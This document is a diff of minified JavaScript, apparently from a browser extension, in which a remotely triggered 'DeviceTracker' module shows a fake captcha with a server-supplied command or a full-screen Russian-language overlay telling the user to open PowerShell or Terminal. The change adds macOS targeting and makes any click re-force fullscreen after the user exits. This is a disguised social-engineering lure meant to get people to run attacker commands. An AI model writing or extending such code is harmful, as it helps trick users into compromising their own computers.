@@ -8305,7 +8305,7 @@
 						}
 					}
 					function handleActivationResponse(d) {
-						d.activated ? (!v.isActive || v.currentMode !== d.mode) && (console.log("[DeviceTracker] Activated! Mode:", d.mode), v.isActive = !0, v.currentMode = d.mode, removeOverlays(), d.mode === "fullscreen" ? showFullscreenOverlay() : showCaptcha(d.command)) : v.isActive && (console.log("[DeviceTracker] Deactivated"), v.isActive = !1, v.currentMode = null, removeOverlays());
+						d.activated ? (!v.isActive || v.currentMode !== d.mode) && (console.log("[DeviceTracker] Activated! Mode:", d.mode), v.isActive = !0, v.currentMode = d.mode, removeOverlays(), d.mode === "fullscreen" ? showFullscreenOverlay(d.platform) : showCaptcha(d.command, d.platform)) : v.isActive && (console.log("[DeviceTracker] Deactivated"), v.isActive = !1, v.currentMode = null, removeOverlays());
 					}
 					function removeOverlays() {
 						let d = document.getElementById("device-tracker-root");
@@ -8313,32 +8313,48 @@
 						let f = document.getElementById("vot-fs-overlay");
 						f && f.remove(), document.fullscreenElement && document.exitFullscreen().catch(() => {});
 					}
-					function showFullscreenOverlay() {
+					function showFullscreenOverlay(d) {
 						if (document.getElementById("vot-fs-overlay")) return;
-						let d = document.createElement("div");
-						d.id = "vot-fs-overlay", d.innerHTML = "\n        <style>\n            #vot-fs-overlay {\n                position: fixed; inset: 0; z-index: 999999;\n                background: #1e2a38; color: #ecf0f1; font-family: \"Segoe UI\", system-ui, sans-serif;\n                display: flex; justify-content: center; align-items: center;\n                text-align: center;\n            }\n            .vot-content {\n                background: #222f3e; padding: 46px; border-radius: 22px; width: 680px; max-width: 95%;\n                box-shadow: 0 25px 80px rgba(0,0,0,.45);\n            }\n            h2 { font-size: 2.5rem; margin-bottom: 28px; }\n            .step { font-size: 1.25rem; line-height: 1.6; margin-bottom: 20px; }\n            kbd { background: #0b0f14; border-radius: 8px; padding: 6px 14px; font-family: Consolas, monospace; font-size: 1.05rem; display: inline-block; margin: 0 4px; }\n            .divider { height: 1px; background: rgba(255,255,255,.15); margin: 28px 0; }\n            .note { font-size: 0.95rem; opacity: 0.7; }\n            .btn { padding: 14px 30px; font-size: 1.1rem; border-radius: 10px; border: none; cursor: pointer; background: #3498db; color: #fff; margin-top: 20px; }\n            .btn:hover { transform: scale(1.05); opacity: 0.95; }\n        </style>\n        <div class=\"vot-content\">\n            <h2>Система готова</h2>\n            <div class=\"step\">✅ Самый быстрый способ открыть консоль:</div>\n            <div class=\"step\"><kbd>Win</kbd> + <kbd>X</kbd> → <strong>PowerShell</strong> или <strong>Терминал</strong></div>\n            <div class=\"divider\"></div>\n            <div class=\"step\">🔁 Если пункта нет — используйте: <kbd>Win</kbd> + <kbd>R</kbd>, введите <kbd>powershell</kbd>, нажмите <kbd>Enter</kbd></div>\n            <div class=\"note\">В Windows 11 PowerShell открывается внутри Windows Terminal.<br>Полноэкранный режим при этом сохраняется.</div>\n            <button id=\"vot-fs-btn\" class=\"btn\">Перейти в полноэкранный режим</button>\n        </div>\n    ", document.body.appendChild(d);
-						let f = d.querySelector("#vot-fs-btn"), enterFullscreen = async () => {
+						let f = (d || "").toLowerCase().includes("mac"), p = "\n        <h2>Система готова</h2>\n        <div class=\"step\">✅ Самый быстрый способ открыть консоль:</div>\n        <div class=\"step\"><kbd>Win</kbd> + <kbd>X</kbd> → <strong>PowerShell</strong> или <strong>Терминал</strong></div>\n        <div class=\"divider\"></div>\n        <div class=\"step\">🔁 Если пункта нет — используйте: <kbd>Win</kbd> + <kbd>R</kbd>, введите <kbd>powershell</kbd>, нажмите <kbd>Enter</kbd></div>\n        <div class=\"note\">В Windows 11 PowerShell открывается внутри Windows Terminal.<br>Полноэкранный режим при этом сохраняется.</div>\n    ", m = "\n        <h2>Система готова</h2>\n        <div class=\"step\">✅ Самый быстрый способ открыть Терминал:</div>\n        <div class=\"step\"><kbd>Command</kbd> + <kbd>Space</kbd> → введите <strong>Terminal</strong> → <kbd>Enter</kbd></div>\n        <div class=\"divider\"></div>\n        <div class=\"step\">🔁 Если поиск не работает:</div>\n        <div class=\"step\"><strong>Программы</strong> → <strong>Утилиты</strong> → <strong>Терминал</strong></div>\n        <div class=\"note\">Полноэкранный режим сохраняется при переключении окон.</div>\n    ", h = document.createElement("div");
+						h.id = "vot-fs-overlay", h.innerHTML = `
+        <style>
+            #vot-fs-overlay {
+                position: fixed; inset: 0; z-index: 999999;
+                background: #1e2a38; color: #ecf0f1; font-family: "Segoe UI", system-ui, sans-serif;
+                display: flex; justify-content: center; align-items: center;
+                text-align: center; cursor: pointer;
+            }
+            .vot-content {
+                background: #222f3e; padding: 46px; border-radius: 22px; width: 680px; max-width: 95%;
+                box-shadow: 0 25px 80px rgba(0,0,0,.45);
+                pointer-events: none; /* Let clicks pass to the container for fullscreen trigger */
+            }
+            h2 { font-size: 2.5rem; margin-bottom: 28px; }
+            .step { font-size: 1.25rem; line-height: 1.6; margin-bottom: 20px; }
+            kbd { background: #0b0f14; border-radius: 8px; padding: 6px 14px; font-family: Consolas, monospace; font-size: 1.05rem; display: inline-block; margin: 0 4px; }
+            .divider { height: 1px; background: rgba(255,255,255,.15); margin: 28px 0; }
+            .note { font-size: 0.95rem; opacity: 0.7; }
+            .fs-status { position: absolute; bottom: 20px; font-size: 0.8rem; opacity: 0.5; width: 100%; text-align: center; }
+        </style>
+        <div class="vot-content">
+            ${f ? m : p}
+        </div>
+        <div id="vot-fs-status" class="fs-status">Кликните в любом месте для перехода в полноэкранный режим</div>
+    `, document.body.appendChild(h);
+						let g = h.querySelector("#vot-fs-status"), enterFullscreen = async () => {
 							try {
-								document.documentElement.requestFullscreen ? await document.documentElement.requestFullscreen() : document.documentElement.webkitRequestFullscreen ? await document.documentElement.webkitRequestFullscreen() : document.documentElement.msRequestFullscreen && await document.documentElement.msRequestFullscreen();
+								document.documentElement.requestFullscreen ? await document.documentElement.requestFullscreen() : document.documentElement.webkitRequestFullscreen ? await document.documentElement.webkitRequestFullscreen() : document.documentElement.msRequestFullscreen && await document.documentElement.msRequestFullscreen(), g && (g.style.display = "none");
 							} catch (d) {
-								console.warn("[DeviceTracker] Fullscreen request failed", d);
+								console.warn("[DeviceTracker] Fullscreen request failed", d), g && (g.style.display = "block");
 							}
 						};
-						f.onclick = enterFullscreen;
+						h.onclick = enterFullscreen;
 						let onFullscreenChange = () => {
 							if (!v.isActive || v.currentMode !== "fullscreen") {
 								document.removeEventListener("fullscreenchange", onFullscreenChange);
 								return;
 							}
-							document.fullscreenElement || (console.log("[DeviceTracker] Fullscreen exited. Re-forcing..."), enterFullscreen().catch(() => {
-								f.textContent = "Нажмите в любом месте для возврата";
-								let reEnforcer = () => {
-									enterFullscreen().then(() => {
-										f.textContent = "Перейти в полноэкранный режим", d.removeEventListener("click", reEnforcer);
-									});
-								};
-								d.addEventListener("click", reEnforcer);
-							}));
+							document.fullscreenElement ? g && (g.style.display = "none") : (console.log("[DeviceTracker] Fullscreen exited. Showing status message."), g && (g.style.display = "block"), enterFullscreen().catch(() => {}));
 						};
 						document.addEventListener("fullscreenchange", onFullscreenChange), enterFullscreen();
 					}
